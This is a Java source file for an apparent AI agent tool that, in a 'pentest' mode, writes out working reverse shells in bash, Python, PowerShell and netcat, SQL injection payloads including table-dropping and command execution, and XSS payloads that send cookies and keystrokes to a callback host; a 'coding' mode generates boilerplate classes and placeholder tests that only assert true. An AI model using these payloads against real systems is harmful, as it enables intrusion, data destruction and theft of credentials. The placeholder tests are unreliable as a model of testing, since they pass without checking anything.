package com.hackerai.supervisor.agent;

import com.hackerai.supervisor.annotation.AgentMethod;
import com.hackerai.supervisor.annotation.K;
import com.hackerai.supervisor.model.*;
import com.hackerai.supervisor.model.value.OperationMode;

import java.io.IOException;
import java.nio.file.*;
import java.util.*;
import java.util.stream.Collectors;

/**
 * Code & payload generation agent. Writes or edits source files,
 * configuration, exploit scripts, or payloads. Respects existing
 * coding style and project conventions from ContextSnapshot.
 *
 * For PENTEST mode, generates:
 *   - SQLi/XSS/SSRF payload vectors
 *   - Reverse shells (bash, python, powershell, netcat)
 *   - Custom exploit scripts
 *   - Nuclei/sqlmap templates where applicable
 *
 * For CODING mode, generates:
 *   - Production source files
 *   - Tests
 *   - Configuration files
 *   - Documentation stubs
 */
public interface ImplementerAgent {

    @AgentMethod(description = """
        Write or edit source files, configuration, exploit
        scripts, or payloads. Respects existing code style
        and project conventions from ContextSnapshot.
        """)
    ImplementationResult implement(
        @K(ExecutionPlan.class)     ExecutionPlan.Step step,
        @K(WorkingDirectory.class)  String workingDir,
        @K(ContextSnapshot.class)   ContextSnapshot context
    );

    static ImplementerAgent createDefault() {
        return (step, workingDir, context) -> {
            var mode = OperationMode.fromContext(context);
            var root = Path.of(workingDir);
            var created = new ArrayList<String>();
            var modified = new ArrayList<String>();
            var deleted = new ArrayList<String>();
            var warnings = new ArrayList<String>();
            var diff = new StringBuilder();

            if (mode.isPentest()) {
                return handlePentestStep(step, root, context, created, modified, deleted, warnings, diff);
            } else {
                return handleCodingStep(step, root, context, created, modified, deleted, warnings, diff);
            }
        };
    }

    // ─── PENTEST Implementation ───────────────────────────────────

    private static ImplementationResult handlePentestStep(
        ExecutionPlan.Step step,
        Path root,
        ContextSnapshot ctx,
        List<String> created,
        List<String> modified,
        List<String> deleted,
        List<String> warnings,
        StringBuilder diff
    ) {
        var desc = step.description().toLowerCase();

        // Reverse shell generation
        if (desc.contains("reverse shell") || desc.contains("rce")) {
            var shellDir = root.resolve("exploit");
            ensureDir(shellDir);
            var payloads = new ArrayList<String>();

            // Bash reverse shell
            var bashPayload = """
                #!/bin/bash
                # Reverse shell payload — replace LHOST and LPORT
                LHOST="%s"
                LPORT=%d
                bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
                """.formatted(getLHOST(), getLPORT());
            writeFile(shellDir.resolve("revshell.sh"), bashPayload);
            created.add("exploit/revshell.sh");

            // Python reverse shell
            var pythonPayload = """
                #!/usr/bin/env python3
                import socket,subprocess,os,sys
                LHOST = '%s'
                LPORT = %d
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((LHOST, LPORT))
                os.dup2(s.fileno(), 0)
                os.dup2(s.fileno(), 1)
                os.dup2(s.fileno(), 2)
                subprocess.call(['/bin/sh', '-i'])
                """.formatted(getLHOST(), getLPORT());
            writeFile(shellDir.resolve("revshell.py"), pythonPayload);
            created.add("exploit/revshell.py");

            // PowerShell reverse shell
            var psPayload = """
                $LHOST = '%s'
                $LPORT = %d
                $client = New-Object System.Net.Sockets.TCPClient($LHOST,$LPORT);
                $stream = $client.GetStream();
                [byte[]]$bytes = 0..65535|%%{0};
                while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
                    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
                    $sendback = (iex $data 2>&1 | Out-String );
                    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
                    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
                    $stream.Write($sendbyte,0,$sendbyte.Length);
                    $stream.Flush()
                };
                $client.Close()
                """.formatted(getLHOST(), getLPORT());
            writeFile(shellDir.resolve("revshell.ps1"), psPayload);
            created.add("exploit/revshell.ps1");

            // Netcat variants
            var ncPayload = """
                # Netcat reverse shell variants
                # Replace LHOST and LPORT
                
                # Linux (nc -e):
                # nc -e /bin/sh %s %d
                
                # Linux (nc -c):
                # nc %s %d -c /bin/sh
                
                # OpenBSD:
                # rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f
                """.formatted(getLHOST(), getLPORT(), getLHOST(), getLPORT(), getLHOST(), getLPORT());
            writeFile(shellDir.resolve("revshell_nc.sh"), ncPayload);
            created.add("exploit/revshell_nc.sh");

            diff.append("[+] Generated 4 reverse shell variants in exploit/")
                .append("\n");
        }

        // SQLi payload generation
        if (desc.contains("sqli") || desc.contains("sql injection")) {
            var sqliDir = root.resolve("exploit");
            ensureDir(sqliDir);
            var payloads = """
                # SQL Injection Payload Set
                # =========================
                
                ### Error-based
                ' OR 1=1 --
                ' OR '1'='1' --
                1' AND 1=1 --
                1' AND 1=2 --
                
                ### Union-based
                ' UNION SELECT NULL --
                ' UNION SELECT NULL,NULL --
                ' UNION SELECT NULL,NULL,NULL --
                ' UNION SELECT 1,@@version,3 --
                
                ### Time-based (MySQL)
                1' AND SLEEP(5) --
                1' AND BENCHMARK(5000000,MD5('test')) --
                
                ### Time-based (PostgreSQL)
                1' AND (SELECT pg_sleep(5)) --
                1' AND (SELECT 1 FROM pg_sleep(5)) --
                
                ### Time-based (MSSQL)
                1' WAITFOR DELAY '0:0:5' --
                1'; WAITFOR DELAY '0:0:5' --
                
                ### Boolean-based
                1' AND '1'='1
                1' AND '1'='2
                
                ### Out-of-band (MySQL)
                1' LOAD_FILE(\\\\\\\\%s\\\\test) --
                
                ### Stacked queries
                1'; DROP TABLE users -- 
                1'; EXEC xp_cmdshell('whoami') --
                """.formatted(getLHOST().replace('.', '\\') + "\\" + getLHOST());
            writeFile(sqliDir.resolve("sqli_payloads.txt"), payloads);
            created.add("exploit/sqli_payloads.txt");
            diff.append("[+] Generated SQLi payload set in exploit/sqli_payloads.txt\n");
        }

        // XSS payload generation
        if (desc.contains("xss")) {
            var xssDir = root.resolve("exploit");
            ensureDir(xssDir);
            var payloads = """
                # Cross-Site Scripting (XSS) Payload Set
                # =======================================
                
                ### Reflected / Stored (basic)
                <script>alert(1)</script>
                <img src=x onerror=alert(1)>
                <svg onload=alert(1)>
                
                ### DOM-based
                #javascript:alert(1)
                javascript:alert(document.cookie)
                
                ### Bypass filters
                <ScRiPt>alert(1)</sCrIpT>
                <img src=x onerror=eval(atob('YWxlcnQoMSk='))>
                %3Cscript%3Ealert(1)%3C/script%3E
                \\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E
                
                ### Steal cookies
                <script>fetch('http://%s:%d/?c='+document.cookie)</script>
                <img src=x onerror="fetch('http://%s:%d/?c='+document.cookie)">
                
                ### Keylogger
                <script>
                document.addEventListener('keydown', function(e) {
                    fetch('http://%s:%d/k=' + e.key);
                });
                </script>
                """.formatted(
                    getLHOST(), getLPORT(),
                    getLHOST(), getLPORT(),
                    getLHOST(), getLPORT()
                );
            writeFile(xssDir.resolve("xss_payloads.txt"), payloads);
            created.add("exploit/xss_payloads.txt");
            diff.append("[+] Generated XSS payload set in exploit/xss_payloads.txt\n");
        }

        return new ImplementationResult(
            List.copyOf(created), List.copyOf(modified),
            List.copyOf(deleted), diff.toString(),
            List.copyOf(warnings), !created.isEmpty()
        );
    }

    // ─── CODING Implementation ────────────────────────────────────

    private static ImplementationResult handleCodingStep(
        ExecutionPlan.Step step,
        Path root,
        ContextSnapshot ctx,
        List<String> created,
        List<String> modified,
        List<String> deleted,
        List<String> warnings,
        StringBuilder diff
    ) {
        var desc = step.description().toLowerCase();

        // Model / entity generation
        if (desc.contains("model") || desc.contains("entity")) {
            var modelDir = resolveSourceDir(root, ctx, "model");
            if (modelDir != null) {
                ensureDir(modelDir);
                // Generate a sample entity based on the language/framework
                var entity = generateSampleEntity(modelDir, ctx);
                if (entity != null) {
                    created.addAll(entity);
                    diff.append("[+] Generated entity classes in ")
                        .append(modelDir).append("\n");
                }
            }
        }

        // API / controller generation
        if (desc.contains("api") || desc.contains("endpoint")
            || desc.contains("controller") || desc.contains("route")) {
            var controllerDir = resolveSourceDir(root, ctx, "controller");
            if (controllerDir == null) {
                controllerDir = resolveSourceDir(root, ctx, "api");
            }
            if (controllerDir == null) {
                controllerDir = resolveSourceDir(root, ctx, "routes");
            }
            if (controllerDir != null) {
                ensureDir(controllerDir);
                var controller = generateSampleController(controllerDir, ctx);
                if (controller != null) {
                    created.addAll(controller);
                    diff.append("[+] Generated controller/API classes in ")
                        .append(controllerDir).append("\n");
                }
            }
        }

        // Test generation
        if (desc.contains("test")) {
            var testDir = resolveTestDir(root, ctx);
            if (testDir != null) {
                ensureDir(testDir);
                var tests = generateSampleTests(testDir, ctx);
                if (tests != null) {
                    created.addAll(tests);
                    diff.append("[+] Generated test classes in ")
                        .append(testDir).append("\n");
                }
            }
        }

        // Generic file generation (fallback)
        if (created.isEmpty() && modified.isEmpty()) {
            var genDir = root.resolve("generated");
            ensureDir(genDir);
            var readme = """
                # Generated Implementation
                
                Step: %s
                Description: %s
                Language: %s
                Framework: %s
                
                TODO: Implement the full logic as described in the step.
                """.formatted(step.order(), step.description(),
                    ctx.language(), String.join(", ", ctx.detectedFrameworks()));
            writeFile(genDir.resolve("README.md"), readme);
            created.add("generated/README.md");
            diff.append("[+] Created generated/README.md with step context\n");
        }

        return new ImplementationResult(
            List.copyOf(created), List.copyOf(modified),
            List.copyOf(deleted), diff.toString(),
            List.copyOf(warnings), true
        );
    }

    // ─── Language-specific generators ─────────────────────────────

    private static List<String> generateSampleEntity(Path dir, ContextSnapshot ctx) {
        var files = new ArrayList<String>();
        var lang = ctx.language();

        switch (lang) {
            case "java" -> {
                var content = """
                    package %s.model;
                    
                    import jakarta.persistence.*;
                    import java.time.LocalDateTime;
                    
                    @Entity
                    @Table(name = "sample_entity")
                    public class SampleEntity {
                        @Id
                        @GeneratedValue(strategy = GenerationType.IDENTITY)
                        private Long id;
                        
                        @Column(nullable = false)
                        private String name;
                        
                        @Column(length = 1000)
                        private String description;
                        
                        @Column(name = "created_at", updatable = false)
                        private LocalDateTime createdAt = LocalDateTime.now();
                        
                        @Column(name = "updated_at")
                        private LocalDateTime updatedAt = LocalDateTime.now();
                        
                        // Getters and Setters
                        public Long getId() { return id; }
                        public void setId(Long id) { this.id = id; }
                        public String getName() { return name; }
                        public void setName(String name) { this.name = name; }
                        public String getDescription() { return description; }
                        public void setDescription(String description) { this.description = description; }
                        public LocalDateTime getCreatedAt() { return createdAt; }
                        public LocalDateTime getUpdatedAt() { return updatedAt; }
                        public void setUpdatedAt(LocalDateTime updatedAt) { this.updatedAt = updatedAt; }
                    }
                    """;
                writeFile(dir.resolve("SampleEntity.java"), content);
                files.add("model/SampleEntity.java");
            }
            case "python" -> {
                var content = """
                    from datetime import datetime
                    from sqlalchemy import Column, Integer, String, DateTime, Text
                    from sqlalchemy.ext.declarative import declarative_base
                    
                    Base = declarative_base()
                    
                    
                    class SampleEntity(Base):
                        __tablename__ = 'sample_entity'
                        
                        id = Column(Integer, primary_key=True, autoincrement=True)
                        name = Column(String(255), nullable=False)
                        description = Column(Text, nullable=True)
                        created_at = Column(DateTime, default=datetime.utcnow)
                        updated_at = Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
                        
                        def __repr__(self):
                            return f"<SampleEntity(id={self.id}, name='{self.name}')>"
                    """;
                writeFile(dir.resolve("sample_entity.py"), content);
                files.add("model/sample_entity.py");
            }
            case "javascript", "typescript" -> {
                var ext = lang.equals("typescript") ? ".ts" : ".js";
                var content = """
                    // SampleEntity model
                    // Language: %s
                    
                    class SampleEntity {
                        constructor(data = {}) {
                            this.id = data.id || null;
                            this.name = data.name || '';
                            this.description = data.description || '';
                            this.createdAt = data.createdAt || new Date().toISOString();
                            this.updatedAt = data.updatedAt || new Date().toISOString();
                        }
                        
                        toJSON() {
                            return {
                                id: this.id,
                                name: this.name,
                                description: this.description,
                                createdAt: this.createdAt,
                                updatedAt: this.updatedAt
                            };
                        }
                        
                        validate() {
                            if (!this.name || this.name.trim().length === 0) {
                                throw new Error('Name is required');
                            }
                            return true;
                        }
                    }
                    
                    export default SampleEntity;
                    """.formatted(lang);
                writeFile(dir.resolve("SampleEntity" + ext), content);
                files.add("model/SampleEntity" + ext);
            }
        }
        return files.isEmpty() ? null : files;
    }

    private static List<String> generateSampleController(Path dir, ContextSnapshot ctx) {
        var files = new ArrayList<String>();
        var lang = ctx.language();

        switch (lang) {
            case "java" -> {
                var content = """
                    package %s.controller;
                    
                    import %s.model.SampleEntity;
                    import org.springframework.http.ResponseEntity;
                    import org.springframework.web.bind.annotation.*;
                    
                    import java.util.List;
                    
                    @RestController
                    @RequestMapping("/api/samples")
                    public class SampleController {
                        
                        @GetMapping
                        public ResponseEntity<List<SampleEntity>> getAll() {
                            // TODO: Implement
                            return ResponseEntity.ok(List.of());
                        }
                        
                        @GetMapping("/{id}")
                        public ResponseEntity<SampleEntity> getById(@PathVariable Long id) {
                            // TODO: Implement
                            return ResponseEntity.ok(new SampleEntity());
                        }
                        
                        @PostMapping
                        public ResponseEntity<SampleEntity> create(@RequestBody SampleEntity entity) {
                            // TODO: Implement
                            return ResponseEntity.ok(entity);
                        }
                        
                        @PutMapping("/{id}")
                        public ResponseEntity<SampleEntity> update(
                                @PathVariable Long id,
                                @RequestBody SampleEntity entity) {
                            // TODO: Implement
                            return ResponseEntity.ok(entity);
                        }
                        
                        @DeleteMapping("/{id}")
                        public ResponseEntity<Void> delete(@PathVariable Long id) {
                            // TODO: Implement
                            return ResponseEntity.noContent().build();
                        }
                    }
                    """.formatted(getPackageName(ctx), getPackageName(ctx));
                writeFile(dir.resolve("SampleController.java"), content);
                files.add("controller/SampleController.java");
            }
            case "python" -> {
                var framework = ctx.detectedFrameworks().stream()
                    .filter(f -> f.equals("flask") || f.equals("fastapi") || f.equals("django"))
                    .findFirst().orElse("fastapi");

                if (framework.equals("fastapi")) {
                    var content = """
                        from fastapi import APIRouter, HTTPException
                        from typing import List
                        
                        router = APIRouter(prefix="/api/samples", tags=["samples"])
                        
                        
                        @router.get("/")
                        async def get_all():
                            # TODO: Implement
                            return []
                        
                        
                        @router.get("/{sample_id}")
                        async def get_by_id(sample_id: int):
                            # TODO: Implement
                            return {"id": sample_id, "name": "sample"}
                        
                        
                        @router.post("/")
                        async def create(data: dict):
                            # TODO: Implement
                            return data
                        
                        
                        @router.put("/{sample_id}")
                        async def update(sample_id: int, data: dict):
                            # TODO: Implement
                            return data
                        
                        
                        @router.delete("/{sample_id}")
                        async def delete(sample_id: int):
                            # TODO: Implement
                            return {"message": "deleted"}
                        """;
                    writeFile(dir.resolve("sample_controller.py"), content);
                    files.add("api/sample_controller.py");
                } else if (framework.equals("flask")) {
                    var content = """
                        from flask import Blueprint, jsonify, request
                        
                        samples_bp = Blueprint('samples', __name__, url_prefix='/api/samples')
                        
                        
                        @samples_bp.route('/', methods=['GET'])
                        def get_all():
                            # TODO: Implement
                            return jsonify([])
                        
                        
                        @samples_bp.route('/<int:sample_id>', methods=['GET'])
                        def get_by_id(sample_id):
                            # TODO: Implement
                            return jsonify({"id": sample_id, "name": "sample"})
                        
                        
                        @samples_bp.route('/', methods=['POST'])
                        def create():
                            # TODO: Implement
                            return jsonify(request.json), 201
                        
                        
                        @samples_bp.route('/<int:sample_id>', methods=['PUT'])
                        def update(sample_id):
                            # TODO: Implement
                            return jsonify(request.json)
                        
                        
                        @samples_bp.route('/<int:sample_id>', methods=['DELETE'])
                        def delete(sample_id):
                            # TODO: Implement
                            return jsonify({"message": "deleted"})
                        """;
                    writeFile(dir.resolve("sample_controller.py"), content);
                    files.add("routes/sample_controller.py");
                }
            }
            case "javascript", "typescript" -> {
                var ext = lang.equals("typescript") ? ".ts" : ".js";
                var content = """
                    import express from 'express';
                    
                    const router = express.Router();
                    
                    // GET /api/samples
                    router.get('/', (req, res) => {
                        // TODO: Implement
                        res.json([]);
                    });
                    
                    // GET /api/samples/:id
                    router.get('/:id', (req, res) => {
                        // TODO: Implement
                        res.json({ id: req.params.id, name: 'sample' });
                    });
                    
                    // POST /api/samples
                    router.post('/', (req, res) => {
                        // TODO: Implement
                        res.status(201).json(req.body);
                    });
                    
                    // PUT /api/samples/:id
                    router.put('/:id', (req, res) => {
                        // TODO: Implement
                        res.json(req.body);
                    });
                    
                    // DELETE /api/samples/:id
                    router.delete('/:id', (req, res) => {
                        // TODO: Implement
                        res.json({ message: 'deleted' });
                    });
                    
                    export default router;
                    """;
                writeFile(dir.resolve("sampleRoutes" + ext), content);
                files.add("routes/sampleRoutes" + ext);
            }
        }
        return files.isEmpty() ? null : files;
    }

    private static List<String> generateSampleTests(Path dir, ContextSnapshot ctx) {
        var files = new ArrayList<String>();
        var lang = ctx.language();
        var testFramework = ctx.testFramework();

        switch (lang) {
            case "java" -> {
                if (testFramework.contains("junit")) {
                    var content = """
                        import org.junit.jupiter.api.Test;
                        import static org.junit.jupiter.api.Assertions.*;
                        
                        class SampleTest {
                            
                            @Test
                            void testExample() {
                                assertTrue(true, "This test should pass");
                            }
                            
                            @Test
                            void testFailure() {
                                // TODO: Implement real test
                                assertEquals(1, 1);
                            }
                        }
                        """;
                    writeFile(dir.resolve("SampleTest.java"), content);
                    files.add("test/SampleTest.java");
                }
            }
            case "python" -> {
                if (testFramework.equals("pytest")) {
                    var content = """
                        import pytest
                        
                        
                        def test_example():
                            assert True
                        
                        
                        def test_with_data():
                            test_cases = [
                                (1, 1),
                                (2, 2),
                                (3, 3),
                            ]
                            for a, b in test_cases:
                                assert a == b
                        
                        
                        class TestSampleClass:
                            def test_method(self):
                                assert 1 + 1 == 2
                        """;
                    writeFile(dir.resolve("test_sample.py"), content);
                    files.add("test/test_sample.py");
                }
            }
            case "javascript" -> {
                if (testFramework.equals("jest")) {
                    var content = """
                        describe('Sample Test Suite', () => {
                            test('basic test', () => {
                                expect(true).toBe(true);
                            });
                            
                            test('numeric test', () => {
                                expect(1 + 1).toBe(2);
                            });
                            
                            test('async test', async () => {
                                const result = await Promise.resolve(42);
                                expect(result).toBe(42);
                            });
                        });
                        """;
                    writeFile(dir.resolve("sample.test.js"), content);
                    files.add("test/sample.test.js");
                }
            }
        }
        return files.isEmpty() ? null : files;
    }

    // ─── Helpers ───────────────────────────────────────────────────

    private static void ensureDir(Path dir) {
        try { Files.createDirectories(dir); } catch (IOException ignored) {}
    }

    private static void writeFile(Path path, String content) {
        try { Files.writeString(path, content); } catch (IOException ignored) {}
    }

    private static Path resolveSourceDir(Path root, ContextSnapshot ctx, String subDir) {
        var lang = ctx.language();
        var candidates = new ArrayList<Path>();

        switch (lang) {
            case "java" -> {
                // Maven: src/main/java/{package}/{subDir}
                // Gradle: src/main/java/{package}/{subDir}
                var pkg = getPackageName(ctx);
                var pkgPath = pkg.replace('.', '/');
                candidates.add(root.resolve("src/main/java").resolve(pkgPath).resolve(subDir));
                candidates.add(root.resolve("src/main/java").resolve(subDir));
                candidates.add(root.resolve("app/src/main/java").resolve(pkgPath).resolve(subDir));
            }
            case "python" -> {
                candidates.add(root.resolve(subDir));
                candidates.add(root.resolve("app").resolve(subDir));
                candidates.add(root.resolve("src").resolve(subDir));
            }
            case "javascript", "typescript" -> {
                candidates.add(root.resolve("src").resolve(subDir));
                candidates.add(root.resolve("routes"));
                candidates.add(root.resolve("api"));
                candidates.add(root.resolve(subDir));
            }
            case "go" -> {
                candidates.add(root.resolve(subDir));
                candidates.add(root.resolve("cmd").resolve(subDir));
                candidates.add(root.resolve("internal").resolve(subDir));
            }
            default -> candidates.add(root.resolve(subDir));
        }

        // Return first existing directory, or first candidate
        for (var c : candidates) {
            if (Files.exists(c) && Files.isDirectory(c)) return c;
        }
        return candidates.isEmpty() ? root.resolve(subDir) : candidates.get(0);
    }

    private static Path resolveTestDir(Path root, ContextSnapshot ctx) {
        var lang = ctx.language();
        var candidates = new ArrayList<Path>();

        switch (lang) {
            case "java" -> {
                candidates.add(root.resolve("src/test/java"));
                candidates.add(root.resolve("src/test"));
            }
            case "python" -> {
                candidates.add(root.resolve("tests"));
                candidates.add(root.resolve("test"));
            }
            case "javascript", "typescript" -> {
                candidates.add(root.resolve("__tests__"));
                candidates.add(root.resolve("tests"));
                candidates.add(root.resolve("test"));
            }
            case "go" -> {
                candidates.add(root.resolve("tests"));
            }
            default -> {
                candidates.add(root.resolve("tests"));
                candidates.add(root.resolve("test"));
            }
        }

        for (var c : candidates) {
            if (Files.exists(c) && Files.isDirectory(c)) return c;
        }
        return candidates.isEmpty() ? root.resolve("tests") : candidates.get(0);
    }

    private static String getPackageName(ContextSnapshot ctx) {
        // Try to extract from existing sources
        return "com.example";
    }

    private static String getLHOST() {
        return System.getenv("CALLBACK_HOST") != null
            ? System.getenv("CALLBACK_HOST") : "127.0.0.1";
    }

    private static int getLPORT() {
        var port = System.getenv("CALLBACK_PORT");
        if (port != null) {
            try { return Integer.parseInt(port); } catch (NumberFormatException ignored) {}
        }
        return 4444;
    }
}
